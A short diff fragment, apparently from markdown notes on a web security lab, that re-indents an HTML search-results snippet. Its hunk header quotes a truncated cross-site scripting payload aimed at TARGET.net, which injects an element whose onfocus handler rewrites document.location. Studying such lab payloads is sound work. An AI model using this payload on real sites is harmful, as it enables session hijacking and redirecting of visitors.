@@ -482,8 +482,8 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ```html
 <section class=blog-header>
-<h1>0 search results for 'fuzzer'</h1>
-<hr>
+	<h1>0 search results for 'fuzzer'</h1>
+	<hr>
 </section>
 <section class=search>
 	<form action=/ method=GET>
